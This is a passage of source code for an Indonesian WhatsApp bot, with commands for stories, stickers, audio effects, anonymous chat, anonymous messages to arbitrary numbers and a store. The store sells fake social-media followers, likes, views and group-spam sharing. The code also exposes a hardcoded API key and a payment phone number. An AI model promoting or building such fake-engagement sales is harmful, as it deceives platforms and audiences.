❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penyesalan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`penyesalan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perjuangan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`perjuangan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perpisahan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`perpisahan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-persahabatan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`persahabatan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-petualangan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`petualangan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-ramadhan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`ramadhan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-remaja':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`remaja`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rindu':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`rindu`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rohani':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let cerpe = await cerpen(`rohani`)
reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-romantis':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`romantis`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sastra':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`sastra`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sedih':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`sedih`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sejarah':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`sejarah`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
//DDONE//
//INI FITUR STICKER YA DECK//
case 'patrick':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/patrick?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'lonet':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/lonte?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'lidi':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'kucing':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kucing?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'sponbob':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'kawansponbob':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'popoci':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/popoci?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'meow':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/meow?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'menjamet':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/menjamet?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'tyni':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/tyni?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'gojosatoru':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'hopeboy':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/hope-boy?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'doge':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/doge?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'dinokuning':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/dyno-kuning?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'nicholas':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'krrobot':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'jiisho':
m.reply(mess.wait)
dica.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/jisoo?apikey=dhmDlD5x`}}, {quoted: m })
break

//done//
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await dica.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                dica.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                dica.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!itsMeDica) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Contoh : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Contoh : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                dica.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break

//INI UNTUK FITUR STORE YA KAWAN//
case 'store':{
  // send a list message!
   const sections = [
    {
	title: "Store -1",
	rows: [
	   {
	    title: "Tiktok", 
	    rowId: `storett`,
	    description: "List Harga Tiktok [Followers, Likes, Views]",
	   },	    
     ]
    },
    {
	title: "Store -2",
	rows: [
	   {
	    title: "Instagram", 
	    rowId: `storeig`,
	    description: "List Harga Instagram [Followers, Likes, Views]",
	   },	    
     ]
    },
    {
	title: "Store -3",
	rows: [
	   {
	    title: "Facebook", 
	    rowId: `storefb`,
	    description: "List Harga Facebook [Belum Tersedia]",
	   },	    
     ]
    },
    {
	title: "Store -4",
	rows: [
	   {
	    title: "YouTube", 
	    rowId: `storeyt`,
	    description: "List Harga YouTube [Subscribe, Likes, Jam Tayang]",
	   },	    
     ]
    },
    {
	title: "Store -5",
	rows: [
	   {
	    title: "Shope/Bukalapak/Tokopedia", 
	    rowId: `storetk`,
	    description: "List Harga [Belum Tersedia]",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Welcome To Kilaaa Store_*`,
   footer: "Kilaaa",
   title: "",
   buttonText: "Silahkan Dipilih !!",
   sections
   }

  dica.sendMessage(m.chat, listMessage, {quoted:m})


  }
break
// INI FITUR STORE YA JING //
case 'order': {
            	if (!text) throw `Mau order apaan?`
               let ownernya = yaayaa + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `*Orderan Nich*\nDari  @${me.split('@')[0]} \n\nOrderannya\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'makasih', buttonText: { displayText: 'KONFIRMASI' }, type: 1 }]
            await dica.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments})
            let akhji = `Tengkyu kak @${me.split('@')[0]} Sudah order.\n*ꜱᴇʟᴀɴᴊᴜᴛɴyᴀ ᴄʜᴀᴛ ᴋᴇ ꜱɪɴɪ yᴀʜ ᴋᴀᴋ.\n\nᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍᴋᴀɴ ᴜꜱᴇʀɴᴀᴍᴇ/ᴜʀʟ ᴅᴀɴ ᴋᴏɴꜰɪʀᴍᴀꜱɪ ᴩᴇᴍʙᴀyᴀʀᴀɴ ɴyᴀ \n\n\n𝑻𝒆𝒓𝒊𝒎𝒂𝒌𝒂𝒔𝒊𝒉*`
            await dica.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            await new Promise(resolve => setTimeout(resolve, 2000));
           await dica.sendContact(m.chat, global.owner);
            }
            break


//Layanan Instagram 
case 'storeig':{
   const sections = [
    {
	title: "Instagram Followers",
	rows: [
	   {
	    title: "1000 Followers", 
	    rowId: `order ig 1k fols harga 10k`,
	    description: "Harga 10.000 Garansi 30Hari",
	   },	    
     ]
    },
    {
    	title: "Instagram Views",
	rows: [
	   {
	    title: "1000 Views ", 
	    rowId: `order ig 1k views harga 500`,
	description: "Harga 500",
	   },	    
     ]
    },
    {
    	title: "Instagram Likes",
	rows: [
	   {
	    title: "1000 Likes", 
	    rowId: `order ig 1k like harga 8k`,
	description: "Harga 8.000 Garansi 30Hari",
	   },	    
     ]
    },
    {
    	title: "Instagram Komentar",
	rows: [
	   {
	    title: "Komentar", 
	    rowId: `order ig komentar belum tersedia`,
	description: "Belum Tersedia",
	   },	    
     ]
    },
    {
    	title: "Instagram Share",
	rows: [
	   {
	    title: "1000 Share", 
	    rowId: `order ig 1k share harga 5000`,
	description: "Harga 5.000",
	   },	    
     ]
    }
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname}_*\n*_Ini List Harga Instagram_*\n*Harga berlaku untuk kelipatannya yah kak*`,
   footer: "Kilaaa",
   title: "",
   buttonText: "Cek Harga !!",
   sections
   }

  dica.sendMessage(m.chat, listMessage, {quoted:m})


  }
break
case 'storett':{
   const sections = [
    {
	title: "Tiktok Followers",
	rows: [
	   {
	    title: "1000 Followers", 
	    rowId: `order tiktok 1k fols, harga 23k`,
	    description: "Harga 23.000",
	   },	    
     ]
    },
    {
    	title: "Tiktok Views",
	rows: [
	   {
	    title: "1000 Views ", 
	    rowId: `order tiktok 1k views harga 500`,
	description: "Harga 500",
	   },	    
     ]
    },
    {
    	title: "Tiktok Likes",
	rows: [
	   {
	    title: "1000 Likes", 
	    rowId: `order tiktok 1k likes harga 15k`,
	description: "Harga 15.000",
	   },	    
     ]
    },
    {
    	title: "Tiktok Share",
	rows: [
	   {
	    title: "1000 Share", 
	    rowId: `order tiktok 1k share harga 2k`,
	description: "Harga 2.000",
	   },	    
     ]
    },
    {
    	title: "Tiktok koment",
	rows: [
	   {
	    title: "KOMENTAR", 
	    rowId: `order tiktok komen belum ready`,
	description: "BELUM TERSEDIA",
	   },	    
     ]
    },
    {
         title: "TIKTOK LIVE STREAMING",
	rows: [
	   {
	    title: "Views Livestream", 
	    rowId: `order tiktom Livestream pre-order`,
	description: "PRE ORDER",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname}_*\n*_Ini List Harga Tiktok_*\n*Harga berlaku untuk kelipatannya yah kak*`,
   footer: "Kilaaa",
   title: "",
   buttonText: "Cek Harga !!",
   sections
   }

  dica.sendMessage(m.chat, listMessage, {quoted:m})


  }
break
case 'storeyt':{
   const sections = [
    {
	title: "YouTube subscribe No Garansi",
	rows: [
	   {
	    title: "1000 SUBSCRIBE", 
	    rowId: `order yutub 1k subs no garansi harga 147k`,
	    description: "Harga: 147.000",
	   },	    
     ]
    },
    {
    	title: "YouTube Subscribe Bergaransi",
	rows: [
	   {
	    title: "1000 Subscribe", 
	    rowId: `order yutub 1k subs bergaransi, harga 188k`,
	description: "Harga: 188.000",
	   },	    
     ]
    },
    {
    	title: "YouTube Views No Garansi",
	rows: [
	   {
	    title: "1000 Views", 
	    rowId: `order yutub 1k views no garansi belum ready`,
	description: "BELUM TERSEDIA",
	   },	    
     ]
    },
    {
    	title: "YouTube Views Berganrasi",
	rows: [
	   {
	    title: "1000 Views", 
	    rowId: `order yutub 1k views bergaransi harga 20k`,
	description: "Harga 20,000",
	   },	    
     ]
    },
    {
    	title: "YouTube Jam Tayang",
	rows: [
	   {
	    title: "1000 Jam Tayang", 
	    rowId: `order yutub 1k jam tayang, harga 304k`,
	description: "Harga 304.000",
	   },	    
     ]
    },
    {
    	title: "YouTube Likes/Dislike",
	rows: [
	   {
	    title: "1000 Likes/Dislikes", 
	    rowId: `order yutub 1k like/dislike harga 12k `,
	description: "12.000",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname}_*\n*_Ini List Harga Youtube_*\n*Harga berlaku untuk kelipatannya yah kak*`,
   footer: "Kilaaa",
   title: "",
   buttonText: "Cek Harga !!",
   sections
   }

  dica.sendMessage(m.chat, listMessage, {quoted:m})


  }
break
case 'storefb':{
   const sections = [
    {
	title: "Facebook Profil Followers",
	rows: [
	   {
	    title: "1000 Followers", 
	    rowId: `order facebook 1k profil followers harha 49k bergaransi`,
	    description: "Harga 49.000 Garansi 30Hari",
	   },	    
     ]
    },
    {
    	title: "Facebook Page Followers",
	rows: [
	   {
	    title: "1000 Followers", 
	    rowId: `order Facebook 1k page folllowers harga 85k bergaransi`,
	description: "Harga 85.000 Garansi Lifetime",
	   },	    
     ]
    },
    {
    	title: "Facebook Group Member",
	rows: [
	   {
	    title: "1000 Member", 
	    rowId: `order Facebook 1k grup member harga 21k`,
	description: "Harga 21.000",
	   },	    
     ]
    },
    {
    	title: "Facebok Post Likes",
	rows: [
	   {
	    title: "1000 Likes", 
	    rowId: `order Facebook 1k post likes harga 23k`,
	description: "Harga 23.000 Optianal 😂😡😍",
	   },	    
     ]
    },
    {
    	title: "Facebook Likes Reels Short",
	rows: [
	   {
	    title: "1000 Likes", 
	    rowId: `order Facebook 1k Likes Reels Short harga 20k`,
	description: "Harga 20.000 Garansi 30Hari",
	   },	    
     ]
    },
    {
    	title: "Facebook Livestream Views",
	rows: [
	   {
	    title: "Opsional", 
	    rowId: `order Facebook livestreaming views pre order`,
	description: "Pre Order",
	   },	    
     ]
    }     
    ]

  const listMessage = {
   text: `*_Hai kak ${pushname}_*\n*_Ini List Harga Facebook_*\n*Harga berlaku untuk kelipatannya yah kak*`,
   footer: "Kilaaa",
   title: "",
   buttonText: "Cek Harga !!",
   sections
   }

  dica.sendMessage(m.chat, listMessage, {quoted:m})


  }
break

//Nyobain addlist moga work hwhw

// Jasa jasa
case 'jasasher':
case 'jasher': {
menunya = `🇯‌‌🇦‌‌🇸‌‌🇦‌•‌🇸‌‌🇭‌‌🇦‌‌🇷‌‌🇪‌

┏━━━━━━━━━━━━━━━━━━
┃  *⎙ MENYEDIAKAN ⎙*
┃     *JASA SHARE*
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃      *50 GRUP*
┃• *1X SHARE : 300P*
┃• *3X SHARE : 700P*
┃• *4X SHARE : 900P*
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃      *100 GRUP*
┃• *1X SHARE : 1000*
┃• *2X SHARE : 1.400*
┃• *3X SHARE : 1.900*
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃      *200 GRUP*
┃• *1X SHARE : 2.200*
┃• *2X SHARE : 2.300*
┃• *3X SHARE : 2.500*
┃• *5X SHARE : 2.700*
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃     *300 GRUP*
┃• *1X SHARE : 2.500*
┃• *2X SHARE : 2.900*
┃• *3X SHARE : 3.100*
┗━━━━━━━━━━━━━━━━━━━


*DIJAMIN NGALIRRRR POLL🤖*
🗣️ : *ADA TESTI GK BG*
👤 : *TESTI JIBUN POKOKNYA  DIJAMIN NGALIRR*🤑
*▰▰▰▰▰▰▰▰▰▰▰▰▰*


*⎙ PAKET PERJAM ⎙*
*[ 2JAM 6K 200 GRUB ]*
*[ 3JAM 13K 330 GRUB ]*
*[ 5JAM 20K 450 GRUB ]*

*JEDA UNTUK PERJAM HANYA 5MENIT 4×SHARE UNTUK 1JAM*


*PAKET PERHARI*

*1HARI = 10K*
*2HARI = 18K*
*3HARI = 25K*
*4HARI = 34K*
*5HARI = 40K*`

buttons = [
          { buttonId: `payment`, buttonText: { displayText: 'ᴘᴀʏᴍᴇɴᴛ' }, type: 1 },
          { buttonId: `owner`, buttonText: { displayText: 'ᴏᴡɴᴇʀ' }, type: 1 }
        ]
        dica.sendButtonText(m.chat, buttons, menunya, nyoutube, )
}
 break
case 'payment':
menunya = `*Hai Kak* *${pushname}* *${ucapanWaktu}*\n*「 PAYMENT 」*

• *BCA Scan Qris Di Atas !!*
• *Dana* : 081238996370
• *Gopay* : 081238996370`

butt = [
          { buttonId: `menu`, buttonText: { displayText: 'ᴍᴇɴᴜ' }, type: 1 },
          { buttonId: `owner`, buttonText: { displayText: 'ᴏᴡɴᴇʀ' }, type: 1 }
        ]
        dica.sendMessage(m.chat, { image: fs.readFileSync('./media/donasi.jpg'), caption: `${menunya}`, buttons: butt, footer: nyoutube}, { quoted: m })

break
//fitur menfess//
        case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
				 let teksnya = `Hai kk ada Menfess nih!!\n\nDari :  _${saking}_  \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`

				 var button = [{ buttonId: `menfesconfirm`, buttonText: { displayText: `CONFIRM` }, type: 1 }, { buttonId: `sewabot`, buttonText: { displayText: `SEWABOT` }, type: 1 }]
					dica.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: `dica_yt1\nhttps://dicasec.tk` })
				m.reply(`Sukses Mengirim Menfess!!`)
				break

			case 'menfesconfirm':
 				 dica.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🌹`})
				  m.reply(`Terimakasih Menfess Telah Diterima.`)
				break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await dica.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, dica.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await dica.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, dica.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await dica.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, dica.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, dica.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
